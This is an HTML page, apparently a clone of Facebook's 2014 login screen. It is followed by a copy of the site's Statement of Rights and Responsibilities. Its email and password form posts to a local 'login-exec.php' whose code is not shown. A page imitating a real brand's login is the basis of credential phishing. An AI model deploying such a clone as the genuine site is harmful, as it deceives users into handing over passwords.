
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <link rel="shortcut icon" href="loginImg/title.jpg" />
    <title>Welcome to Facebook-Login</title>
    <link type="text/css" href="css/login.css" rel="stylesheet"></link>
 <link type="text/css" href="css/rights.css" rel="stylesheet"></link>
       <script type="text/javascript" src="jquery/jquery-1.11.1.js"></script>
<script src="jquery/forgotPassword.js" type="text/javascript"></script>

   </head>
<body>
   
    <div id="header">
        <div id="facebook">
            <a href="login.php" style="color:white;">facebook</a>
        </div>
	<form action="login-exec.php" method="post" name="form2" id="form2" onSubmit="return logvalidate()">
    
        <div class="login">
            <span class="loginText">Email or Phone &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
                &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password</span>
            <br />
            <input type="text" ID="login" name="login" class="textBox">
            &nbsp &nbsp
            <input type="password" ID="password1" name="password1" class="textBox">
           <input type="submit" id="submit" class="loginButton" value="Log In">
            
            <br />
            <span class="smallerText">
                <input type="checkbox" ID="CheckBox1"/>
               <span > Keep me logged in </a>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
                &nbsp; &nbsp; <a href="forgotPassword.html" style=color:#9C9CCC;">Forgot your password?</a> </span>
        </div>
    </div>
</form>
<div id="data">

<h3>Statement of Rights and Responsibilities</h3>

<div class="text">
This Statement of Rights and Responsibilities ("Statement," "Terms," or "SRR") derives from the <a href="#">Facebook Principles</a>, and is our terms of service that governs our
 relationship with users and others who interact with Facebook. By using or accessing Facebook, you agree to this Statement, as updated from time to time in accordance
 with Section 14 below. Additionally, you will find resources at the end of this document that help you understand how Facebook works.
</div>
<h4>1. Privacy</h4>

<div class="text">
Your privacy is very important to us. We designed our <a href="#">Data Use Policy</a> to make important disclosures about how you can use Facebook to share with others and how we collect and can use your content and information.  We encourage you to read the Data Use Policy, and to use it to help you make informed decisions.
 </div>


<h4>2. Sharing Your Content and Information</h4>
<div class="text">
You own all of the content and information you post on Facebook, and you can control how it is shared through your <a href="#">privacy</a> and <a href="#">application settings</a>. In addition:<br>
<div class="text2"><br><br>1. For content that is covered by intellectual property rights, like photos and videos (IP content), you specifically give us the following permission, subject to your <a href="#">privacy</a> and <a href="#">application settings</a>: you grant us a non-exclusive, transferable, sub-licensable, royalty-free, worldwide license to use any IP content that you post on or in connection with Facebook (IP License). This IP License ends when you delete your IP content or your account unless your content has been shared with others, and they have not deleted it.
<br><br>2. When you delete IP content, it is deleted in a manner similar to emptying the recycle bin on a computer. However, you understand that removed content may persist in backup copies for a reasonable period of time (but will not be available to others).
<br><br>3. When you use an application, the application may ask for your permission to access your content and information as well as content and information that others have shared with you.  We require applications to respect your privacy, and your agreement with that application will control how the application can use, store, and transfer that content and information.  (To learn more about Platform, including how you can control what information other people may share with applications, read our <a href="#">Data Use Policy</a> and <a href="#">Platform Page</a>.)
<br><br>4. When you publish content or information using the Public setting, it means that you are allowing everyone, including people off of Facebook, to access and use that information, and to associate it with you (i.e., your name and profile picture).
<br><br>5. We always appreciate your feedback or other suggestions about Facebook, but you understand that we may use them without any obligation to compensate you for them (just as you have no obligation to offer them).
</div></div>

<h3>3. Safety</h3>
<div class="text">
We do our best to keep Facebook safe, but we cannot guarantee it. We need your help to keep Facebook safe, which includes the following commitments by you:
<div class="text2">
<br>1. You will not post unauthorized commercial communications (such as spam) on Facebook.
<br><br>2. You will not collect users' content or information, or otherwise access Facebook, using automated means (such as harvesting bots, robots, spiders, or scrapers) without our prior permission.
<br><br>3. You will not engage in unlawful multi-level marketing, such as a pyramid scheme, on Facebook.
<br><br>3. You will not upload viruses or other malicious code.
<br><br>5. You will not solicit login information or access an account belonging to someone else.
<br><br>6. You will not bully, intimidate, or harass any user.
<br><br>7. You will not post content that: is hate speech, threatening, or pornographic; incites violence; or contains nudity or graphic or gratuitous violence.
<br><br>8. You will not develop or operate a third-party application containing alcohol-related, dating or other mature content (including advertisements) without appropriate age-based restrictions.
<br><br>9. You will follow our <a href="#">Promotions Guidelines</a> and all applicable laws if you publicize or offer any contest, giveaway, or sweepstakes (“promotion”) on Facebook.
<br><br>10. You will not use Facebook to do anything unlawful, misleading, malicious, or discriminatory.
<br><br>11. You will not do anything that could disable, overburden, or impair the proper working or appearance of Facebook, such as a denial of service attack or interference with page rendering or other Facebook functionality.
<br><br>12. You will not facilitate or encourage any violations of this Statement or our policies.
 

</div></div>
<h4>4. Registration and Account Security</h4>
<div class="text">
Facebook users provide their real names and information, and we need your help to keep it that way. Here are some commitments you make to us relating to registering and maintaining the security of your account:
<div class="text2">
<br><br>1. You will not provide any false personal information on Facebook, or create an account for anyone other than yourself without permission.
<br><br>2. You will not create more than one personal account.
<br><br>3. If we disable your account, you will not create another one without our permission.
<br><br>4. You will not use your personal timeline primarily for your own commercial gain, and will use a Facebook Page for such purposes.
<br><br>5. You will not use Facebook if you are under 13.
<br><br>6. You will not use Facebook if you are a convicted sex offender.
<br><br>7. You will keep your contact information accurate and up-to-date.
<br><br>8. You will not share your password (or in the case of developers, your secret key), let anyone else access your account, or do anything else that might jeopardize the security of your account.
<br><br>9. You will not transfer your account (including any Page or application you administer) to anyone without first getting our written permission.
<br><br>10. If you select a username or similar identifier for your account or Page, we reserve the right to remove or reclaim it if we believe it is appropriate (such as when a trademark owner complains about a username that does not closely relate to a user's actual name).
</div>
</div>


<h4>You may also want to review the following documents, which provide additional information about your use of Facebook:</h4>
<div class="text">
<ul type="square">
<li><a href="#">Data Use Policy</a>: The Data Use Policy contains information to help you understand how we collect and use information.
</li><br><li><a href="#">Payment Terms</a>: These additional terms apply to all payments made on or through Facebook.
</li><br><li><a href="#">Platform Page</a>: This page helps you better understand what happens when you add a third-party application or use Facebook Connect, including how they may access and use your data.
</li><br><li><a href="#">Facebook Platform Policies</a>: These guidelines outline the policies that apply to applications, including Connect sites.
</li><br><li><a href="#">Advertising Guidelines</a>: These guidelines outline the policies that apply to advertisements placed on Facebook.
</li><br><li><a href="#">Promotions Guidelines</a>: These guidelines outline the policies that apply if you offer contests, sweepstakes, and other types of promotions on Facebook.
</li><br><li><a href="#">Facebook Brand Resources</a>: These guidelines outline the policies that apply to use of Facebook trademarks, logos and screenshots.
</li><br><li>How to Report Claims of Intellectual Property Infringement
</li><br><li><a href="#">Pages Terms</a>: These guidelines apply to your use of Facebook Pages.
</li><br><li><a href="#">Community Standards</a>: These guidelines outline our expectations regarding the content you post to Facebook and your activity on Facebook.
</ul>

<br><br>
To access the Statement of Rights and Responsibilities in several different languages, change the language setting for your Facebook session by clicking on the language link in the left corner of most pages.  If the Statement is not available in the language you select, we will default to the English version.


<br>
<br>
<br>
<hr>

<br>
<span style="font-size:11px;">
<a href="#">Mobile</a> &nbsp;   &nbsp;&nbsp;   &nbsp;   &nbsp;  <a href="#">Find Friends</a>  &nbsp;  &nbsp;  &nbsp;   &nbsp;   <a href="#">Badges</a>   &nbsp;   &nbsp; &nbsp;   &nbsp;   <a href="#">People</a> &nbsp;   &nbsp;   &nbsp; &nbsp;    <a href="#">Pages</a> &nbsp;&nbsp;    &nbsp;   &nbsp;    <a href="#">Places</a> &nbsp; &nbsp;   &nbsp;   &nbsp;    <a href="#">Games</a>&nbsp; &nbsp;   &nbsp;   &nbsp;    <a href="#">Locations</a>&nbsp;   &nbsp;   &nbsp;    <a href="#">About</a>
<br>
<a href="#">Create Ad</a> &nbsp;   &nbsp;   &nbsp;  <a href="CreatePage.html">Create Page</a>  &nbsp;   &nbsp;   &nbsp;   <a href="#">Developers</a>   &nbsp;   &nbsp;   &nbsp;   <a href="#">Career</a> &nbsp;   &nbsp;   &nbsp; &nbsp;    <a href="#">Privacy</a> &nbsp;   &nbsp;   &nbsp;&nbsp;     <a href="#">Cookies</a> &nbsp;   &nbsp;   &nbsp;  &nbsp;   <a href="#">Terms</a>&nbsp;   &nbsp;  &nbsp;  &nbsp;    <a href="#">Help</a>
<br><br>
Facebook &copy; 2014
<br>
<a href="#">English (US)</a>
</span>
</div>
</div>
</div>
</body>
</html>